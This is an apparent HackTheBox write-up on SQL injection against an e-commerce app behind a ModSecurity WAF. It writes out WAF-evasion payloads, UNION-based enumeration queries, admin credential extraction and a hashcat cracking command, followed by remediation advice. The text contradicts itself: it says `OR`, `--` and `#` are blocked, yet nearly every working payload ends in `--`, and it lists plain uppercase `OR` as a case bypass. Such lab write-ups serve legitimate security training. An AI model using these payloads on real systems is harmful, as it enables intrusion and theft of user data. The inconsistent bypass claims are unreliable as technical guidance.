---
title: Advanced SQL Injection with WAF Bypass
layout: default
---

# Advanced SQL Injection with WAF Bypass

**Platform:** HackTheBox  
**Difficulty:** Medium  
**Date:** November 15, 2024  
**Category:** Web Security, SQL Injection, WAF Bypass

---

## Overview

This writeup covers a comprehensive approach to exploiting SQL injection vulnerabilities while bypassing Web Application Firewalls (WAF). The target application had ModSecurity WAF enabled with strict rules, requiring creative evasion techniques to successfully exploit the vulnerability.

## Target Information

- **Application:** E-commerce web application
- **WAF:** ModSecurity with OWASP Core Rule Set
- **Database:** MySQL 8.0
- **Vulnerability:** SQL Injection in search parameter

## Initial Discovery

While testing the search functionality, I noticed that the application was vulnerable to SQL injection. However, any attempt to inject SQL payloads was immediately blocked by the WAF.

### Basic Test Payload

```sql
' OR 1=1--
```

**Result:** Request blocked by WAF with 403 Forbidden response.

## WAF Analysis

Before attempting bypass techniques, I analyzed the WAF behavior:

1. **Blocked Keywords:** `UNION`, `SELECT`, `OR`, `AND`, `--`, `#`
2. **Encoding Detection:** Basic URL encoding was detected
3. **Comment Styles:** Both `--` and `#` comments were blocked

## Bypass Techniques

### 1. Case Manipulation

The WAF was case-sensitive, allowing mixed-case payloads to bypass filters:

```sql
' oR 1=1--
' Or 1=1--
' OR 1=1--
```

### 2. Comment Obfuscation

Using inline comments to break up keywords:

```sql
' OR/**/1=1--
' UNION/**/SELECT/**/1,2,3--
' UN/**/ION/**/SE/**/LECT--
```

### 3. Alternative Comment Syntax

MySQL supports multiple comment styles:

```sql
'/*!50000OR*/1=1--
'/*! OR */1=1--
```

## Exploitation Steps

### Step 1: Determine Column Count

Using NULL-based UNION injection with comment obfuscation:

```sql
' UNION/**/SELECT/**/NULL--
' UNION/**/SELECT/**/NULL,NULL--
' UNION/**/SELECT/**/NULL,NULL,NULL--
```

**Result:** Application returned normal results with 3 NULLs, indicating 3 columns.

### Step 2: Identify Injectable Columns

Testing which columns accept string data:

```sql
' UNION/**/SELECT/**/'test',NULL,NULL--
' UNION/**/SELECT/**/NULL,'test',NULL--
' UNION/**/SELECT/**/NULL,NULL,'test'--
```

**Result:** All three columns accepted string data.

### Step 3: Database Enumeration

Extracting database information:

```sql
' UNION/**/SELECT/**/database(),user(),version()--
```

**Output:**
- Database: `ecommerce_db`
- User: `webapp@localhost`
- Version: `8.0.33-0ubuntu0.20.04.2`

### Step 4: Table Enumeration

Listing all tables in the database:

```sql
' UNION/**/SELECT/**/table_name,NULL,NULL/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()--
```

**Tables Found:**
- `users`
- `products`
- `orders`
- `admin_users`

### Step 5: Column Enumeration

Extracting columns from the `admin_users` table:

```sql
' UNION/**/SELECT/**/column_name,NULL,NULL/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='admin_users'--
```

**Columns Found:**
- `id`
- `username`
- `password`
- `email`
- `created_at`

### Step 6: Data Extraction

Retrieving admin credentials:

```sql
' UNION/**/SELECT/**/username,password,email/**/FROM/**/admin_users--
```

**Retrieved Data:**
```
admin:$2y$10$abcdef123456...:admin@ecommerce.local
support:$2y$10$xyz789...:support@ecommerce.local
```

## Post-Exploitation

### Password Cracking

The passwords were hashed using bcrypt. Using hashcat with a common password list:

```bash
hashcat -m 3200 -a 0 hashes.txt rockyou.txt
```

**Cracked Passwords:**
- `admin`: `Admin@2024!`
- `support`: `Support123`

### Admin Access

Successfully logged in to the admin panel using the cracked credentials and gained full control over the application.

## Impact

- **Severity:** Critical
- **CVSS Score:** 9.8
- **Impact:** Complete compromise of application data, including customer PII, payment information, and administrative access

## Remediation

### Immediate Actions

1. **Implement Prepared Statements**
   ```php
   $stmt = $pdo->prepare("SELECT * FROM products WHERE name LIKE ?");
   $stmt->execute(["%$search%"]);
   ```

2. **Update WAF Rules**
   - Add rules for comment obfuscation patterns
   - Implement case-insensitive matching
   - Block inline SQL comments

3. **Input Validation**
   - Whitelist allowed characters
   - Limit input length
   - Sanitize special characters

### Long-term Solutions

- Implement proper authentication and session management
- Use bcrypt with higher cost factor for password hashing
- Regular security audits and penetration testing
- Implement least privilege principle for database users
- Add rate limiting to prevent brute force attacks

## Tools Used

- **Burp Suite**: For intercepting and modifying requests
- **sqlmap**: For automated testing (with manual tweaks)
- **hashcat**: For password cracking
- **Firefox Developer Tools**: For analyzing application behavior

## Key Takeaways

1. WAF bypass requires understanding the specific rules and filters in place
2. Comment obfuscation is highly effective against many WAF implementations
3. Always test multiple bypass techniques in combination
4. Proper input validation and prepared statements are essential defenses
5. Defense in depth: Multiple layers of security would have prevented this attack

## Timeline

- **00:00** - Initial vulnerability discovery
- **00:15** - WAF behavior analysis
- **00:45** - Successful bypass technique identified
- **01:30** - Complete database enumeration
- **02:00** - Admin credentials extracted
- **02:30** - Passwords cracked
- **03:00** - Full admin access achieved

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [ModSecurity Core Rule Set](https://coreruleset.org/)
- [MySQL Comments Syntax](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
- [WAF Bypass Techniques](https://github.com/0xInfection/Awesome-WAF)

---

**Disclaimer:** This writeup is for educational purposes only. Always obtain proper authorization before testing any systems.
